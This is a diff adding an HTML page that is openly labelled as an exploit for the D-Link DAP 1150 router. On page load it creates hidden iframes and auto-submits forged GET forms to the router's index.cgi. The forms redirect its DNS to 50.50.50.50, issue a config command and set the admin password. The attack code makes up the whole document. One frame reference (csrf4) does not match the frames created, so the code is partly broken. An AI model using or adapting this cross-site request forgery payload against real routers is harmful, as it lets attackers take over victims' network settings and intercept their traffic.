@@ -1,0 +1,54 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Exploit for D-Link DAP 1150. Made by MustLive.
+http://websecurity.com.ua&lt;/title&gt;
+&lt;/head&gt;
+&lt;body onLoad=&quot;StartCSRF()&quot;&gt;
+&lt;script&gt;
+function StartCSRF() {
+for (var i=1;i&lt;=3;i++) {
+var ifr = document.createElement(&quot;iframe&quot;);
+ifr.setAttribute(&#039;name&#039;, &#039;csrf&#039;+i);
+ifr.setAttribute(&#039;width&#039;, &#039;0&#039;);
+ifr.setAttribute(&#039;height&#039;, &#039;0&#039;);
+document.body.appendChild(ifr);
+}
+CSRF1();
+setTimeout(CSRF2,1000);
+setTimeout(CSRF3,2000);
+}
+function CSRF1() {
+window.frames[&quot;csrf3&quot;].document.body.innerHTML = &#039;&lt;form name=&quot;hack&quot;
+action=&quot;http://www.example.com/index.cgi&quot;; method=&quot;get&quot;&gt;\n&lt;input type=&quot;hidden&quot;
+name=&quot;v2&quot; value=&quot;y&quot;&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;rq&quot; value=&quot;y&quot;&gt;\n&lt;input
+type=&quot;hidden&quot; name=&quot;res_json&quot; value=&quot;y&quot;&gt;\n&lt;input type=&quot;hidden&quot;
+name=&quot;res_data_type&quot; value=&quot;json&quot;&gt;\n&lt;input type=&quot;hidden&quot;
+name=&quot;res_config_action&quot; value=&quot;3&quot;&gt;\n&lt;input type=&quot;hidden&quot;
+name=&quot;res_config_id&quot; value=&quot;7&quot;&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;res_struct_size&quot;
+value=&quot;0&quot;&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;res_buf&quot;
+value=&quot;{%22manual%22:true,%20%22ifname%22:%22%22,%20%22servers%22:%2250.50.50.50%22,%20%22defroute%22:true}&quot;&gt;\n&lt;/form&gt;&#039;;
+window.frames[&quot;csrf3&quot;].document.hack.submit();
+}
+function CSRF2() {
+window.frames[&quot;csrf4&quot;].document.body.innerHTML = &#039;&lt;form name=&quot;hack&quot;
+action=&quot;http://www.example.com/index.cgi&quot;; method=&quot;get&quot;&gt;\n&lt;input type=&quot;hidden&quot;
+name=&quot;res_cmd&quot; value=&quot;20&quot;&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;res_buf&quot;
+value=&quot;null&quot;&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;res_cmd_type&quot; value=&quot;bl&quot;&gt;\n&lt;input
+type=&quot;hidden&quot; name=&quot;v2&quot; value=&quot;y&quot;&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;rq&quot;
+value=&quot;y&quot;&gt;\n&lt;/form&gt;&#039;;
+window.frames[&quot;csrf4&quot;].document.hack.submit();
+}
+function CSRF3() {
+window.frames[&quot;csrf2&quot;].document.body.innerHTML = &#039;&lt;form name=&quot;hack&quot;
+action=&quot;http://www.example.com/index.cgi&quot;; method=&quot;get&quot;&gt;\n&lt;input type=&quot;hidden&quot;
+name=&quot;v2&quot; value=&quot;y&quot;&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;rq&quot; value=&quot;y&quot;&gt;\n&lt;input
+type=&quot;hidden&quot; name=&quot;res_config_action&quot; value=&quot;3&quot;&gt;\n&lt;input type=&quot;hidden&quot;
+name=&quot;res_config_id&quot; value=&quot;69&quot;&gt;\n&lt;input type=&quot;hidden&quot;
+name=&quot;res_struct_size&quot; value=&quot;1&quot;&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;res_buf&quot;
+value=&quot;password|&quot;&gt;\n&lt;/form&gt;&#039;;
+window.frames[&quot;csrf2&quot;].document.hack.submit();
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
